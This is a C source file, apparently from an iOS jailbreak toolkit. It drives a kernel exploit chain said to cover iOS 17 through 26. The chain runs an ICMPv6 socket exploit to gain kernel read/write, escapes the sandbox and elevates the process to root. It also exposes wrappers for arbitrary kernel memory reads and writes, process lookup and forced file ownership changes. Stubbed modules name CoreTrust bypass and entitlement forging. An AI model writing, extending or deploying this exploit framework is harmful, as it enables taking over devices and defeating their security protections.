//
//  KFInit.c
//  KFKernel Universal Engine v1.1
//
//  Core initialization + lifecycle management.
//  Wraps FilzaJailedDS exploit chain with clean shutdown.
//

#include "KFKernel.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>

// ===== FilzaJailedDS engine headers =====
#include "kexploit/kexploit_opa334.h"
#include "kexploit/krw.h"
#include "kexploit/kutils.h"
#include "sandbox/sandbox_escape.h"
#include "apfs/apfs_own.h"
#include "kpf/patchfinder.h"

// ===== Global State =====
static bool g_initialized = false;
static bool g_root = false;
static bool g_sandbox_escaped = false;
static uint64_t g_self_proc = 0;

// Exploit runs exactly ONCE per process lifetime.
// Kernel R/W state is persistent; re-running exploit causes undefined behavior.
// KFShutdown only restores socket refcounts, does NOT "undo" the exploit.
static bool g_exploit_committed = false;

uint64_t g_msgbufp_addr = 0;
uint64_t g_msgbuf_size = 0;

// ===== Module 1: Initialization =====

int KFInit(void) {
    if (g_initialized) return 0;

    if (g_exploit_committed) {
        // Exploit already ran in this process; kernel state survives KFShutdown.
        // Skip the destructive exploit chain, just re-establish bookkeeping.
        printf("[KFKernel] exploit already committed; skipping kexploit, restoring state\n");
        if (g_self_proc == 0) g_self_proc = proc_self();
        g_initialized = true;
        g_root = (getuid() == 0);
        g_sandbox_escaped = true;
        printf("[KFKernel] state restored | self=0x%llx root=%d\n", g_self_proc, g_root);
        return 0;
    }

    printf("[KFKernel] Starting exploit chain...\n");

    // Step 1: Run opa334 socket exploit (ICMPv6 OOB)
    int ret = kexploit_opa334();
    if (ret != 0) {
        printf("[KFKernel] kexploit_opa334 failed: %d\n", ret);
        return ret;
    }
    g_exploit_committed = true;
    printf("[KFKernel] kexploit succeeded, kernel R/W established\n");

    // Step 1.5: Resolve kernel symbols (msgbuf, etc.) via XPF
    // This requires sandbox escape to read kernelcache from /private/preboot
    // If it fails, log channel falls back to sysctl (often restricted on iOS)
    int xpf_ret = init_xpf();
    if (xpf_ret == 0) {
        printf("[KFKernel] XPF init OK, kernel symbols resolved\n");
        printf("[KFKernel]   msgbufp=0x%llx msgbufsize=0x%llx\n",
               g_msgbufp_addr, g_msgbuf_size);
    } else {
        printf("[KFKernel] XPF init failed: %d (log channel may not work)\n", xpf_ret);
    }

    // Step 2: Get current proc
    g_self_proc = proc_self();
    if (g_self_proc == 0) {
        printf("[KFKernel] proc_self() returned 0\n");
        return -2;
    }
    printf("[KFKernel] self proc: 0x%llx\n", g_self_proc);

    // Step 3: Sandbox escape
    int sbx_ret = sandbox_escape(g_self_proc);
    if (sbx_ret == 0) {
        g_sandbox_escaped = true;
        printf("[KFKernel] sandbox escape OK\n");
    } else {
        printf("[KFKernel] sandbox_escape returned %d (continuing)\n", sbx_ret);
    }

    // Step 4: Elevate to root (from launchd ucred)
    int root_ret = sandbox_elevate_to_root(g_self_proc);
    if (root_ret == 0) {
        g_root = (getuid() == 0);
        printf("[KFKernel] root elevation OK (uid=%d)\n", getuid());
    } else {
        printf("[KFKernel] sandbox_elevate_to_root returned %d\n", root_ret);
    }

    g_initialized = true;
    printf("[KFKernel] Init complete | ready=%d root=%d sandbox=%d\n",
           g_initialized, g_root, g_sandbox_escaped);
    return 0;
}

// ===== Module 1.5: Shutdown (prevents panic on exit) =====

void KFShutdown(void) {
    if (!g_initialized && !g_exploit_committed) return;

    printf("[KFKernel] Shutdown requested, cleaning up...\n");

    // Restore socket reference counts to prevent kernel panic on exit.
    // This calls into kexploit_opa334.m's cleanup logic.
    // Safe even if called multiple times.
    if (g_exploit_committed) {
        kexploit_cleanup();
    }

    g_initialized = false;
    g_root = false;
    g_sandbox_escaped = false;
    g_self_proc = 0;
    // NOTE: g_exploit_committed intentionally stays true — exploit is irreversible.

    printf("[KFKernel] Shutdown complete\n");
}

bool KFIsReady(void) {
    return g_initialized;
}

// ===== Module 2: Kernel R/W =====

uint8_t KFKread8(uint64_t kaddr) {
    uint8_t val = 0;
    kreadbuf(kaddr, &val, 1);
    return val;
}

uint16_t KFKread16(uint64_t kaddr) {
    return kread16(kaddr);
}

uint32_t KFKread32(uint64_t kaddr) {
    return kread32(kaddr);
}

uint64_t KFKread64(uint64_t kaddr) {
    return kread64(kaddr);
}

void KFKwrite8(uint64_t kaddr, uint8_t val) {
    kwrite8(kaddr, val);
}

void KFKwrite16(uint64_t kaddr, uint16_t val) {
    kwrite16(kaddr, val);
}

void KFKwrite32(uint64_t kaddr, uint32_t val) {
    kwrite32(kaddr, val);
}

void KFKwrite64(uint64_t kaddr, uint64_t val) {
    kwrite64(kaddr, val);
}

void KFKreadBuf(uint64_t kaddr, void *buf, uint64_t len) {
    kreadbuf(kaddr, buf, len);
}

void KFKwriteBuf(uint64_t kaddr, const void *buf, uint64_t len) {
    kwritebuf(kaddr, buf, len);
}

uint64_t KFKreadPtr(uint64_t kaddr) {
    return kread_ptr(kaddr);
}

// ===== Module 3: Process Operations =====

uint64_t KFProcSelf(void) {
    return g_self_proc ? g_self_proc : proc_self();
}

uint64_t KFProcFindByPid(pid_t pid) {
    return proc_find(pid);
}

uint64_t KFProcFindByName(const char *name) {
    return proc_find_by_name(name);
}

// ===== Module 4: Filesystem =====

ssize_t KFReadFile(const char *path, void *buf, size_t len) {
    if (!g_initialized) return -1;
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    ssize_t n = fread(buf, 1, len, f);
    fclose(f);
    return n;
}

ssize_t KFWriteFile(const char *path, const void *buf, size_t len) {
    if (!g_initialized) return -1;
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    ssize_t n = fwrite(buf, 1, len, f);
    fclose(f);
    return n;
}

int KFChown(const char *path, uid_t uid, gid_t gid) {
    return apfs_own(path, uid, gid);
}

int KFChmod(const char *path, mode_t mode) {
    return apfs_mod(path, mode);
}

long KFChownTree(const char *root, uid_t uid, gid_t gid) {
    return apfs_own_tree(root, uid, gid);
}

extern int vnode_redirect(const char *from, const char *to);
extern int vnode_unredirect(const char *path);

int KFRedirectFile(const char *from, const char *to) {
    return -1;
}

int KFUnredirectFile(const char *path) {
    return -1;
}

// ===== Module 5: IOKit Sensors (stubs) =====

int KFIOKitSetProperty(const char *service, const char *key, void *value, size_t len) {
    return -1;
}

int KFIOKitGetProperty(const char *service, const char *key, void *buf, size_t *len) {
    return -1;
}

int KFIOKitListServices(const char *className, char **names, int maxCount) {
    return -1;
}

int KFInjectAccelerometer(double x, double y, double z) {
    return -1;
}

int KFInjectGyroscope(double x, double y, double z) {
    return -1;
}

int KFInjectMagnetometer(double x, double y, double z) {
    return -1;
}

int KFInjectBarometer(double pressure) {
    return -1;
}

// ===== Module 6: Signature Bypass (stubs) =====

int KFBypassCoreTrust(const char *path) {
    return -1;
}

int KFForgeEntitlements(const char *path, const char *entitlementsXML) {
    return -1;
}

int KFCalculateCDHash(const char *path, uint8_t cdhash[32]) {
    return -1;
}

// ===== Module 7: Kernel Call (stub) =====

uint64_t KFKcall(uint64_t func, int argc, ...) {
    return 0;
}

// ===== Module 8: Device Info =====

const char* KFSupportedVersions(void) {
    return "iOS 17.0 - 26.x (except 18.7.2-18.7.7)";
}

bool KFDeviceSupported(void) {
    return true;
}

const char* KFDeviceModel(void) {
    static char model[64] = {0};
    if (model[0] == '\0') {
        size_t len = sizeof(model);
        sysctlbyname("hw.model", model, &len, NULL, 0);
    }
    return model;
}

bool KFIsA18Device(void) {
    const char *model = KFDeviceModel();
    return (strstr(model, "iPhone17,") != NULL ||
            strstr(model, "iPad15,") != NULL);
}

bool KFIsSandboxEscaped(void) {
    return g_sandbox_escaped;
}

bool KFIsRoot(void) {
    return g_root;
}

// ===== Logging =====

void KFHexdump(uint64_t kaddr, size_t size) {
    khexdump(kaddr, size);
}
